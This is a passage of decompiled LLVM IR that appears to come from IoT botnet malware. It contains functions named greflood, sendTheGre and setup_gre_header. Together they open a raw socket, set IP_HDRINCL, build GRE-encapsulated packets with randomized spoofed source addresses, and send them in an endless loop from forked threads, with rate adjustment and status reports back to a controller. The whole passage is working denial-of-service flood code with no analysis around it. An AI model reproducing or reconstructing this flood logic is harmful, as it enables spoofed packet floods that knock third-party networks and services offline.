  store i32 16, i32* @r1, align 4
  %v0_d17c = load i32, i32* @r6, align 4
  %v8_d180 = call i32 @__GI_snprintf(i32 ptrtoint (i32* @global_var_536e4.357 to i32), i32 16, i32 ptrtoint ([12 x i8]* @global_var_375a8.359 to i32), i32 %v0_d17c, i32 %v0_d164, i32 %v0_d168, i32 %v2_d15c)
  %v2_d18c = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_d18c, i32* @r6, align 4
  %v2_d19c = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_d19c, i32* @r4, align 4
  %v2_d1ac = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_d1ac, i32* @r5, align 4
  %v2_d1bc = call i32 @realrand(i32 1, i32 255)
  %v0_d1c4 = load i32, i32* @r4, align 4
  %v0_d1c8 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_525a4.361 to i32), i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v0_d1dc = load i32, i32* @r6, align 4
  %v8_d1e0 = call i32 @__GI_snprintf(i32 ptrtoint (i32* @global_var_525a4.361 to i32), i32 16, i32 ptrtoint ([12 x i8]* @global_var_375a8.359 to i32), i32 %v0_d1dc, i32 %v0_d1c4, i32 %v0_d1c8, i32 %v2_d1bc)
  %v2_d1ec = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_d1ec, i32* @r6, align 4
  %v2_d1fc = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_d1fc, i32* @r4, align 4
  %v2_d20c = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_d20c, i32* @r5, align 4
  %v2_d21c = call i32 @realrand(i32 1, i32 255)
  %v0_d224 = load i32, i32* @r4, align 4
  %v0_d228 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_536c8.363 to i32), i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v0_d23c = load i32, i32* @r6, align 4
  %v8_d240 = call i32 @__GI_snprintf(i32 ptrtoint (i32* @global_var_536c8.363 to i32), i32 16, i32 ptrtoint ([12 x i8]* @global_var_375a8.359 to i32), i32 %v0_d23c, i32 %v0_d224, i32 %v0_d228, i32 %v2_d21c)
  %v2_d24c = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_d24c, i32* @r6, align 4
  %v2_d25c = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_d25c, i32* @r4, align 4
  %v2_d26c = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_d26c, i32* @r5, align 4
  %v2_d27c = call i32 @realrand(i32 1, i32 255)
  %v0_d284 = load i32, i32* @r4, align 4
  %v0_d288 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_536fc.365 to i32), i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v0_d29c = load i32, i32* @r6, align 4
  %v8_d2a0 = call i32 @__GI_snprintf(i32 ptrtoint (i32* @global_var_536fc.365 to i32), i32 16, i32 ptrtoint ([12 x i8]* @global_var_375a8.359 to i32), i32 %v0_d29c, i32 %v0_d284, i32 %v0_d288, i32 %v2_d27c)
  %v1_d2a8 = call i32 @__GI_htons(i32 73)
  %sext = mul i32 %v1_d2a8, 65536
  %v1_d2ac = sdiv i32 %sext, 65536
  %v1_d2b8 = trunc i32 %v1_d2ac to i16
  store i16 %v1_d2b8, i16* inttoptr (i32 3 to i16*), align 2
  %v1_d2c4 = call i32 @__GI_htons(i32 65535)
  %v1_d2d4 = trunc i32 %v1_d2c4 to i16
  store i16 %v1_d2d4, i16* inttoptr (i32 5 to i16*), align 2
  store i8 64, i8* inttoptr (i32 9 to i8*), align 1
  %v1_d2e8 = call i32 @__GI_htons(i32 16384)
  %v1_d2f8 = trunc i32 %v1_d2e8 to i16
  store i16 %v1_d2f8, i16* inttoptr (i32 7 to i16*), align 2
  store i8 47, i8* inttoptr (i32 10 to i8*), align 2
  store i32 ptrtoint (i32* @global_var_536e4.357 to i32), i32* @r0, align 4
  %v1_d30c = call i32 @inet_addr(i32 ptrtoint (i32* @global_var_536e4.357 to i32))
  store i32 %v1_d30c, i32* inttoptr (i32 13 to i32*), align 4
  store i32 ptrtoint (i32* @global_var_525a4.361 to i32), i32* @r0, align 4
  %v1_d320 = call i32 @inet_addr(i32 ptrtoint (i32* @global_var_525a4.361 to i32))
  store i32 %v1_d320, i32* inttoptr (i32 17 to i32*), align 4
  %v2_d334 = load i32, i32* @global_var_53714.355, align 4
  store i32 %v2_d334, i32* @r4, align 4
  %v1_d33c = call i32 @__GI_htons(i32 2)
  %sext4 = mul i32 %v1_d33c, 65536
  %v1_d340 = sdiv i32 %sext4, 65536
  %v1_d344 = trunc i32 %v1_d340 to i16
  %v2_d344 = load i32, i32* @r4, align 4
  %v3_d344 = add i32 %v2_d344, 2
  %v4_d344 = inttoptr i32 %v3_d344 to i16*
  store i16 %v1_d344, i16* %v4_d344, align 2
  store i8 69, i8* inttoptr (i32 25 to i8*), align 1
  store i8 0, i8* inttoptr (i32 26 to i8*), align 2
  %v1_d3a0 = call i32 @__GI_htons(i32 540)
  %sext5 = mul i32 %v1_d3a0, 65536
  %v1_d3a4 = sdiv i32 %sext5, 65536
  %v1_d3b0 = trunc i32 %v1_d3a4 to i16
  store i16 %v1_d3b0, i16* inttoptr (i32 27 to i16*), align 2
  %v1_d3b8 = call i32 @__GI_htons(i32 0)
  %v1_d3c8 = trunc i32 %v1_d3b8 to i16
  store i16 %v1_d3c8, i16* inttoptr (i32 29 to i16*), align 2
  store i8 64, i8* inttoptr (i32 33 to i8*), align 1
  %v1_d3dc = call i32 @__GI_htons(i32 16384)
  %v1_d3ec = trunc i32 %v1_d3dc to i16
  store i16 %v1_d3ec, i16* inttoptr (i32 31 to i16*), align 2
  store i8 17, i8* inttoptr (i32 34 to i8*), align 2
  store i32 ptrtoint (i32* @global_var_536c8.363 to i32), i32* @r0, align 4
  %v1_d400 = call i32 @inet_addr(i32 ptrtoint (i32* @global_var_536c8.363 to i32))
  store i32 %v1_d400, i32* inttoptr (i32 37 to i32*), align 4
  store i32 ptrtoint (i32* @global_var_536fc.365 to i32), i32* @r0, align 4
  %v1_d414 = call i32 @inet_addr(i32 ptrtoint (i32* @global_var_536fc.365 to i32))
  store i32 %v1_d414, i32* inttoptr (i32 41 to i32*), align 4
  store i32 %v3_d088, i32* @r4, align 4
  store i32 %v6_d088, i32* @r5, align 4
  store i32 %v9_d088, i32* @r6, align 4
  store i32 %v12_d088, i32* @fp, align 4
  ret i32 %v1_d414

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_536fc.365 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_536c8.363 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_525a4.361 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_536e4.357 to i32), { 1, 2, 0, 3 }
  uselistorder i32* @global_var_53714.355, { 1, 0 }
}

define i32 @setup_gre_header(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  store i32 54356, i32* %stack_var_-4, align 4
  %v2_d450 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d450, i32* @fp, align 4
  %v2_d46c = call i32 @realrand(i32 1, i32 99999)
  %v3_d478 = urem i32 %v2_d46c, 65536
  %v1_d480 = call i32 @__GI_htons(i32 %v3_d478)
  %sext = mul i32 %v1_d480, 65536
  %v1_d484 = sdiv i32 %sext, 65536
  %v1_d490 = trunc i32 %v1_d484 to i16
  store i16 %v1_d490, i16* %arg1, align 2
  %v2_d49c = call i32 @realrand(i32 1, i32 255)
  %v3_d4a8 = urem i32 %v2_d49c, 65536
  %v1_d4b0 = call i32 @__GI_htons(i32 %v3_d4a8)
  %v1_d4c0 = trunc i32 %v1_d4b0 to i16
  %v3_d4c0 = add i32 %tmp, 2
  %v4_d4c0 = inttoptr i32 %v3_d4c0 to i16*
  store i16 %v1_d4c0, i16* %v4_d4c0, align 2
  %v3_d4cc = add i32 %tmp, 6
  %v4_d4cc = inttoptr i32 %v3_d4cc to i16*
  store i16 0, i16* %v4_d4cc, align 2
  %v1_d4d4 = add i32 %tmp, 8
  store i32 %v1_d4d4, i32* @r0, align 4
  store i32 255, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_d4e8 = call i32 @__GI_memset()
  %v1_d4f0 = add i32 %tmp, 12
  store i32 %v1_d4f0, i32* @r3, align 4
  store i32 %v1_d4f0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_375b4.367 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  %v0_d500 = call i32 @memcpy()
  %v1_d508 = call i32 @__GI_htons(i32 520)
  %v2_d508 = trunc i32 %v1_d508 to i16
  %v3_d518 = add i32 %tmp, 4
  %v4_d518 = inttoptr i32 %v3_d518 to i16*
  store i16 %v2_d508, i16* %v4_d518, align 2
  ret i32 %v1_d508

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1, 3, 4 }
}

define i32 @greflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4164 = alloca i32, align 4
  %stack_var_-4160 = alloca i32, align 4
  %stack_var_-4144 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 54584, i32* %stack_var_-4, align 4
  %v2_d534 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d534, i32* @fp, align 4
  %v2_d56c = ptrtoint i32* %stack_var_-4144 to i32
  %v1_d578 = add i32 %v2_d56c, 20
  %v3_d590 = ptrtoint i32* %stack_var_-4160 to i32
  %v1_d594 = add i32 %arg1, 8
  %v1_d598 = inttoptr i32 %v1_d594 to i32*
  %v2_d598 = load i32, i32* %v1_d598, align 4
  %v3_d598 = add i32 %arg1, 12
  %v4_d598 = inttoptr i32 %v3_d598 to i32*
  %v5_d598 = load i32, i32* %v4_d598, align 4
  store i32 %v2_d598, i32* %stack_var_-4160, align 4
  %v3_d5ac = call i32 @socket(i32 2, i32 3, i32 17)
  %v1_d5bc = icmp slt i32 %v3_d5ac, 0
  br i1 %v1_d5bc, label %dec_label_pc_d5c4, label %dec_label_pc_d5cc

dec_label_pc_d5c4:                                ; preds = %entry
  %v1_d5c8 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_d5cc

dec_label_pc_d5cc:                                ; preds = %entry, %dec_label_pc_d5c4
  store i32 %v2_d56c, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v0_d5f0 = call i32 @__GI_memset()
  %v1_d5f8 = bitcast i32* %stack_var_-4144 to i8*
  %v2_d5f8 = call i32 @setup_gre_ip_header(i8* %v1_d5f8)
  %v1_d600 = inttoptr i32 %v1_d578 to i16*
  %v2_d600 = call i32 @setup_gre_header(i16* %v1_d600)
  %v2_d624 = add i32 %v2_d56c, 16
  %v3_d624 = inttoptr i32 %v2_d624 to i32*
  store i32 %v5_d598, i32* %v3_d624, align 4
  %v1_d638 = or i32 %v2_d56c, 2
  %v2_d638 = inttoptr i32 %v1_d638 to i16*
  %v3_d638 = load i16, i16* %v2_d638, align 2
  %v4_d638 = zext i16 %v3_d638 to i32
  %v2_d644 = bitcast i32* %stack_var_-4144 to i16*
  %v3_d644 = call i32 @csum(i16* %v2_d644, i32 %v4_d638)
  %v1_d654 = trunc i32 %v3_d644 to i16
  %v3_d654 = add i32 %v2_d56c, 10
  %v4_d654 = inttoptr i32 %v3_d654 to i16*
  store i16 %v1_d654, i16* %v4_d654, align 2
  store i32 1, i32* %stack_var_-4164, align 4
  %v2_d674 = ptrtoint i32* %stack_var_-4164 to i32
  %v5_d694 = call i32 @__GI_setsockopt(i32 %v3_d5ac, i32 0, i32 3, i32 %v2_d674, i32 4)
  %v1_d69c = icmp slt i32 %v5_d694, 0
  br i1 %v1_d69c, label %dec_label_pc_d6a4, label %dec_label_pc_d6ac

dec_label_pc_d6a4:                                ; preds = %dec_label_pc_d5cc
  %v1_d6a8 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_d6ac

dec_label_pc_d6ac:                                ; preds = %dec_label_pc_d5cc, %dec_label_pc_d6a4
  %v2_d6b0 = call i32 @__GI_time(i32* null)
  %v1_d6bc = call i32 @init_rand(i32 %v2_d6b0)
  %v2_d768 = add i32 %v2_d56c, 12
  %v3_d768 = inttoptr i32 %v2_d768 to i32*
  %v3_d78c = add i32 %v2_d56c, 4
  %v4_d78c = inttoptr i32 %v3_d78c to i16*
  br label %dec_label_pc_d6cc

dec_label_pc_d6cc:                                ; preds = %dec_label_pc_d808, %dec_label_pc_d6ac
  %storemerge = phi i32 [ %v1_d810, %dec_label_pc_d808 ], [ 0, %dec_label_pc_d6ac ]
  %v3_d6d0 = load i16, i16* %v2_d638, align 2
  %v4_d6d0 = zext i16 %v3_d6d0 to i32
  %v6_d70c = call i32 @sendto(i32 %v3_d5ac, i32 %v2_d56c, i32 %v4_d6d0, i32 0, i32 %v3_d590, i32 16)
  %v0_d710 = call i32 @rand_cmwc()
  %v3_d718 = urem i32 %v0_d710, 16777216
  %v3_d720 = sub i32 %v0_d710, %v3_d718
  store i32 %v3_d720, i32* @r4, align 4
  %v0_d724 = call i32 @rand_cmwc()
  %v1_d730 = and i32 %v0_d724, 16711680
  %v0_d738 = load i32, i32* @r4, align 4
  %v2_d738 = or i32 %v0_d738, %v1_d730
  store i32 %v2_d738, i32* @r4, align 4
  %v0_d73c = call i32 @rand_cmwc()
  %v1_d748 = and i32 %v0_d73c, 65280
  %v0_d750 = load i32, i32* @r4, align 4
  %v2_d750 = or i32 %v0_d750, %v1_d748
  store i32 %v2_d750, i32* @r4, align 4
  %v0_d754 = call i32 @rand_cmwc()
  %v1_d75c = urem i32 %v0_d754, 256
  %v0_d760 = load i32, i32* @r4, align 4
  %v2_d760 = or i32 %v0_d760, %v1_d75c
  store i32 %v2_d760, i32* %v3_d768, align 4
  %v0_d76c = call i32 @rand_cmwc()
  %v1_d778 = call i32 @__GI_htonl(i32 %v0_d76c)
  %v1_d78c = trunc i32 %v1_d778 to i16
  store i16 %v1_d78c, i16* %v4_d78c, align 4
  %v3_d7a0 = load i16, i16* %v2_d638, align 2
  %v4_d7a0 = zext i16 %v3_d7a0 to i32
  %v3_d7ac = call i32 @csum(i16* %v2_d644, i32 %v4_d7a0)
  %v1_d7bc = trunc i32 %v3_d7ac to i16
  store i16 %v1_d7bc, i16* %v4_d654, align 2
  %v2_d7c4 = load i32, i32* @global_var_526bc.176, align 4
  %v1_d7c8 = add i32 %v2_d7c4, 1
  store i32 %v1_d7c8, i32* @global_var_526bc.176, align 4
  %v2_d7d8 = load i32, i32* @global_var_52590.178, align 4
  %tmp = icmp ugt i32 %v2_d7d8, %storemerge
  br i1 %tmp, label %dec_label_pc_d808, label %dec_label_pc_d7ec

dec_label_pc_d7ec:                                ; preds = %dec_label_pc_d6cc
  %v2_d7fc = load i32, i32* @global_var_4535c.180, align 4
  %v1_d804 = call i32 @usleep(i32 %v2_d7fc)
  br label %dec_label_pc_d808

dec_label_pc_d808:                                ; preds = %dec_label_pc_d6cc, %dec_label_pc_d7ec
  %stack_var_-4176.0 = phi i32 [ %storemerge, %dec_label_pc_d6cc ], [ 0, %dec_label_pc_d7ec ]
  %v1_d810 = add i32 %stack_var_-4176.0, 1
  br label %dec_label_pc_d6cc

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_d56c, { 5, 1, 2, 3, 0, 4, 6, 7 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-4144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4164, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_d808, { 1, 0 }
  uselistorder label %dec_label_pc_d6ac, { 1, 0 }
  uselistorder label %dec_label_pc_d5cc, { 1, 0 }
}

define i32 @sendTheGre(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 55352, i32* %stack_var_-4, align 4
  %v2_d834 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d834, i32* @fp, align 4
  %v2_d838 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_d838, i32* %r3.global-to-local, align 4
  %v2_d858 = call i32 @__GI_time(i32* null)
  store i32 %v2_d858, i32* %r3.global-to-local, align 4
  %v1_d868 = call i32 @mfork(i32 %arg2)
  store i32 %v1_d868, i32* %r3.global-to-local, align 4
  %v2_d870 = icmp eq i32 %v1_d868, 0
  br i1 %v2_d870, label %dec_label_pc_d878, label %dec_label_pc_dc7c

dec_label_pc_d878:                                ; preds = %entry
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 255, i32* %r2.global-to-local, align 4
  %v3_d884 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v3_d884, i32* %r3.global-to-local, align 4
  %v1_d894 = icmp slt i32 %v3_d884, 0
  br i1 %v1_d894, label %dec_label_pc_d89c, label %dec_label_pc_d8a4

dec_label_pc_d89c:                                ; preds = %dec_label_pc_d878
  %v1_d8a0 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_d8a4

dec_label_pc_d8a4:                                ; preds = %dec_label_pc_d878, %dec_label_pc_d89c
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v8_d8ac = icmp sgt i32 %arg3, 4
  br i1 %v8_d8ac, label %dec_label_pc_d8c8, label %dec_label_pc_d8b0

dec_label_pc_d8b0:                                ; preds = %dec_label_pc_d8a4
  store i32 ptrtoint ([102 x i8]* @global_var_375b8.372 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_d8bc = call i32 @Send(i32 %arg1, i32 ptrtoint ([102 x i8]* @global_var_375b8.372 to i32))
  %v1_d8c4 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_d8c8

dec_label_pc_d8c8:                                ; preds = %dec_label_pc_d8a4, %dec_label_pc_d8b0
  %v1_d8cc = add i32 %arg4, 12
  store i32 %v1_d8cc, i32* %r3.global-to-local, align 4
  %v1_d8d0 = inttoptr i32 %v1_d8cc to i32*
  %v2_d8d0 = load i32, i32* %v1_d8d0, align 4
  store i32 %v2_d8d0, i32* %r3.global-to-local, align 4
  store i32 %v2_d8d0, i32* @r0, align 4
  %v1_d8d8 = call i32 @atol(i32 %v2_d8d0)
  %v1_d8e8 = add i32 %arg4, 16
  store i32 %v1_d8e8, i32* %r3.global-to-local, align 4
  %v1_d8ec = inttoptr i32 %v1_d8e8 to i32*
  %v2_d8ec = load i32, i32* %v1_d8ec, align 4
  store i32 %v2_d8ec, i32* %r3.global-to-local, align 4
  store i32 %v2_d8ec, i32* @r0, align 4
  %v1_d8f4 = call i32 @atol(i32 %v2_d8ec)
  %v1_d904 = add i32 %arg4, 8
  store i32 %v1_d904, i32* %r3.global-to-local, align 4
  %v1_d908 = inttoptr i32 %v1_d904 to i32*
  %v2_d908 = load i32, i32* %v1_d908, align 4
  store i32 %v2_d908, i32* %r3.global-to-local, align 4
  store i32 %v2_d908, i32* @r0, align 4
  %v1_d910 = call i32 @atol(i32 %v2_d908)
  %v1_d920 = add i32 %arg4, 20
  store i32 %v1_d920, i32* %r3.global-to-local, align 4
  %v1_d924 = inttoptr i32 %v1_d920 to i32*
  %v2_d924 = load i32, i32* %v1_d924, align 4
  store i32 %v2_d924, i32* %r3.global-to-local, align 4
  store i32 %v2_d924, i32* @r0, align 4
  %v1_d92c = call i32 @atol(i32 %v2_d924)
  store i32 0, i32* @global_var_52590.178, align 4
  store i32 0, i32* @global_var_526bc.176, align 4
  %v3_d954 = mul i32 %v1_d8d8, 4
  %v1_d95c = add i32 %v3_d954, 14
  %v3_d960 = and i32 %v1_d95c, -8
  %v1_d968 = load i32, i32* @sp, align 4
  %v2_d968 = sub i32 %v1_d968, %v3_d960
  store i32 %v2_d968, i32* %r2.global-to-local, align 4
  %v1_d974 = add i32 %v2_d968, 7
  %v3_d978 = and i32 %v1_d974, -8
  %v3_d99c = urem i32 %v1_d910, 65536
  store i32 %v3_d99c, i32* %r3.global-to-local, align 4
  %v1_d9a4 = call i32 @__GI_htons(i32 %v3_d99c)
  %v1_d9b4 = add i32 %arg4, 4
  store i32 %v1_d9b4, i32* %r3.global-to-local, align 4
  %v1_d9b8 = inttoptr i32 %v1_d9b4 to i32*
  %v2_d9b8 = load i32, i32* %v1_d9b8, align 4
  store i32 %v2_d9b8, i32* %r3.global-to-local, align 4
  store i32 %v2_d9b8, i32* @r0, align 4
  %v1_d9c0 = call i32 @inet_addr(i32 %v2_d9b8)
  %v2_d9d8 = mul i32 %v1_d8d8, 24
  %v1_d9dc = or i32 %v2_d9d8, 7
  %v1_d9e0 = add i32 %v1_d9dc, 7
  %v3_d9e4 = and i32 %v1_d9e0, -8
  %v1_d9ec = load i32, i32* @sp, align 4
  %v2_d9ec = sub i32 %v1_d9ec, %v3_d9e4
  %v1_d9f8 = add i32 %v2_d9ec, 7
  %v3_d9fc = and i32 %v1_d9f8, -8
  %v2_da5c = add i32 %v3_d9fc, 8
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v1_d8d8, i32* %r3.global-to-local, align 4
  %v5_daec37 = icmp sgt i32 %v1_d8d8, 0
  br i1 %v5_daec37, label %dec_label_pc_da24, label %dec_label_pc_daf0

dec_label_pc_da24:                                ; preds = %dec_label_pc_d8c8, %dec_label_pc_da24
  %storemerge138 = phi i32 [ %v1_dad8, %dec_label_pc_da24 ], [ 0, %dec_label_pc_d8c8 ]
  %v2_da34 = mul i32 %storemerge138, 24
  %v2_da38 = add i32 %v2_da34, %v3_d9fc
  %v2_da40 = inttoptr i32 %v2_da38 to i32*
  store i32 %storemerge138, i32* %v2_da40, align 8
  %v2_da60 = add i32 %v2_da5c, %v2_da34
  store i32 %v1_d9c0, i32* %r1.global-to-local, align 4
  %v1_da70 = inttoptr i32 %v2_da60 to i32*
  store i32 2, i32* %v1_da70, align 8
  %v3_da70 = or i32 %v2_da60, 4
  %v4_da70 = inttoptr i32 %v3_da70 to i32*
  %v5_da70 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_da70, i32* %v4_da70, align 4
  %v6_da70 = add i32 %v2_da60, 8
  %v7_da70 = inttoptr i32 %v6_da70 to i32*
  %v8_da70 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_da70, i32* %v7_da70, align 8
  %v9_da70 = add i32 %v2_da60, 12
  %v10_da70 = inttoptr i32 %v9_da70 to i32*
  %v11_da70 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_da70, i32* %v10_da70, align 4
  %v2_da90 = or i32 %v2_da38, 4
  %v2_da98 = inttoptr i32 %v2_da90 to i32*
  store i32 %v1_d910, i32* %v2_da98, align 4
  %v3_daa4 = mul i32 %storemerge138, 4
  %v2_daa8 = add i32 %v3_daa4, %v3_d978
  store i32 %v2_da38, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_d52c.376 to i32), i32* %r2.global-to-local, align 4
  %v4_dad0 = inttoptr i32 %v2_daa8 to i32*
  %v5_dad0 = call i32 @pthread_create(i32* %v4_dad0, i32 0, i32 ptrtoint (i32* @global_var_d52c.376 to i32), i32 %v2_da38)
  %v1_dad8 = add nuw nsw i32 %storemerge138, 1
  store i32 %v1_dad8, i32* %r2.global-to-local, align 4
  store i32 %v1_d8d8, i32* %r3.global-to-local, align 4
  %v5_daec = icmp slt i32 %v1_dad8, %v1_d8d8
  br i1 %v5_daec, label %dec_label_pc_da24, label %dec_label_pc_daf0

dec_label_pc_daf0:                                ; preds = %dec_label_pc_da24, %dec_label_pc_d8c8
  store i32 %v1_d9b4, i32* %r3.global-to-local, align 4
  %v2_daf8 = load i32, i32* %v1_d9b8, align 4
  store i32 %v2_daf8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([29 x i8]* @global_var_37620.378 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_db08 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_37620.378 to i32))
  store i32 %v1_d8e8, i32* %r3.global-to-local, align 4
  %v2_db1c = load i32, i32* %v1_d8ec, align 4
  store i32 %v2_db1c, i32* %r3.global-to-local, align 4
  store i32 %v2_db1c, i32* @r0, align 4
  %v1_db24 = call i32 @atol(i32 %v2_db1c)
  %v2_db30 = mul i32 %v1_db24, 20
  store i32 %v2_db30, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_db3c = icmp sgt i32 %v2_db30, 0
  br i1 %v7_db3c, label %dec_label_pc_db40, label %dec_label_pc_dc74

dec_label_pc_db40:                                ; preds = %dec_label_pc_daf0
  store i32 50, i32* %r1.global-to-local, align 4
  store i32 200, i32* %r2.global-to-local, align 4
  store i32 50000, i32* %r3.global-to-local, align 4
  %v1_db70 = call i32 @usleep(i32 50000)
  %v2_db78 = load i32, i32* @global_var_526bc.176, align 4
  %v2_db80 = mul i32 %v2_db78, 20
  store i32 %v2_db80, i32* %r2.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v2_db80, %v1_d8f4
  %v2_dbd4 = load i32, i32* @global_var_52590.178, align 4
  store i32 %v2_dbd4, i32* %r3.global-to-local, align 4
  br i1 %tmp39, label %dec_label_pc_db90, label %dec_label_pc_dbd0

dec_label_pc_db90:                                ; preds = %dec_label_pc_db40
  %v5_db9c = icmp sgt i32 %v2_dbd4, 0
  br i1 %v5_db9c, label %dec_label_pc_dbb8, label %dec_label_pc_dba0

dec_label_pc_dba0:                                ; preds = %dec_label_pc_db90
  %v2_dba4 = load i32, i32* @global_var_4535c.180, align 4
  %v1_dba8 = add i32 %v2_dba4, 100
  store i32 %v1_dba8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4535c.180 to i32), i32* %r3.global-to-local, align 4
  store i32 %v1_dba8, i32* @global_var_4535c.180, align 4
  br label %dec_label_pc_dc18

dec_label_pc_dbb8:                                ; preds = %dec_label_pc_db90
  %v1_dbc0 = add i32 %v2_dbd4, -1
  store i32 %v1_dbc0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_52590.178 to i32), i32* %r3.global-to-local, align 4
  store i32 %v1_dbc0, i32* @global_var_52590.178, align 4
  br label %dec_label_pc_dc18

dec_label_pc_dbd0:                                ; preds = %dec_label_pc_db40
  %v1_dbd8 = add i32 %v2_dbd4, 1
  store i32 %v1_dbd8, i32* %r2.global-to-local, align 4
  store i32 %v1_dbd8, i32* @global_var_52590.178, align 4
  %v2_dbe8 = load i32, i32* @global_var_4535c.180, align 4
  store i32 %v2_dbe8, i32* %r3.global-to-local, align 4
  %v1_dbec = add i32 %v2_dbe8, -25
  %tmp40 = icmp ult i32 %v2_dbe8, 26
  br i1 %tmp40, label %dec_label_pc_dc0c, label %dec_label_pc_dbf4

dec_label_pc_dbf4:                                ; preds = %dec_label_pc_dbd0
  store i32 %v1_dbec, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4535c.180 to i32), i32* %r3.global-to-local, align 4
  store i32 %v1_dbec, i32* @global_var_4535c.180, align 4
  br label %dec_label_pc_dc18

dec_label_pc_dc0c:                                ; preds = %dec_label_pc_dbd0
  store i32 ptrtoint (i32* @global_var_4535c.180 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @global_var_4535c.180, align 4
  br label %dec_label_pc_dc18

dec_label_pc_dc18:                                ; preds = %dec_label_pc_dbf4, %dec_label_pc_dbb8, %dec_label_pc_dba0, %dec_label_pc_dc0c
  store i32 ptrtoint (i32* @global_var_526bc.176 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @global_var_526bc.176, align 4
  %v2_dc48 = add i32 %v1_d92c, %v2_d858
  br label %dec_label_pc_dc24

dec_label_pc_dc24:                                ; preds = %dec_label_pc_dc64, %dec_label_pc_dc18
  %stack_var_-24.0 = phi i32 [ %tmp, %dec_label_pc_dc18 ], [ %v1_dc68, %dec_label_pc_dc64 ]
  store i32 %stack_var_-24.0, i32* %r3.global-to-local, align 4
  %tmp41 = icmp ult i32 %stack_var_-24.0, 100
  br i1 %tmp41, label %dec_label_pc_dc64, label %dec_label_pc_dc30

dec_label_pc_dc30:                                ; preds = %dec_label_pc_dc24
  %v2_dc34 = call i32 @__GI_time(i32* null)
  store i32 %v2_dc34, i32* %r1.global-to-local, align 4
  store i32 %v2_d858, i32* %r2.global-to-local, align 4
  store i32 %v2_dc48, i32* %r3.global-to-local, align 4
  %v3_dc4c = icmp ult i32 %v2_dc34, %v2_dc48
  br i1 %v3_dc4c, label %dec_label_pc_dc5c, label %dec_label_pc_dc54

dec_label_pc_dc54:                                ; preds = %dec_label_pc_dc30
  %v1_dc58 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_dc5c

dec_label_pc_dc5c:                                ; preds = %dec_label_pc_dc30, %dec_label_pc_dc54
  store i32 0, i32* %r3.global-to-local, align 4
